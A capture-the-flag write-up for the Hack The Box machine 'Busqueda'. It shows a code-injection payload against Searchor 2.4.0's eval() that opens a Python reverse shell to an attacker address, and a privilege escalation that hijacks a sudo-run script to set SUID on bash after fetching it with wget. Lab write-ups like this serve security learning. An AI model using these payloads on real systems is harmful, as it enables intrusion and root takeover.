---
title: "Hack The Box - Busqueda [Easy]"
date: 2023-06-10T19:42:27+03:00
draft: false
tags: ["hackthebox"]
---

This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:

```
Powered by Flask and Searchor 2.4.0

$ whatweb 
Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that `eval()` was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:

```bash
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 67
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

engine=Accuweather&query=',copy_url=__import__('os').system(""" python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<myip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' """))
```

This would create a reverse shell to the machine. 

The currently used user is `svc` upon running 

```bash
$ sudo -l
```

 We can see that we can use this command:
 
```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

I also discovered the `/opt/scripts` folder that had some scripts inside, including `full-checkup.sh`, I've run the command in the `/opt/scripts/` folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me `Something went wrong`, I've created a dummy `full-checkup.sh` with `chmod +s /bin/bash` contents inside and ran the command again, it just printed out `[+] Done` and after that a simple `bash -p` gave me root user. 

```bash
$ cd /tmp && wget http://<ip>:8000/full-checkup.sh && chmod +x ./full-checkup.sh 
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
$ bash -p
$ cat /root/root.txt
```
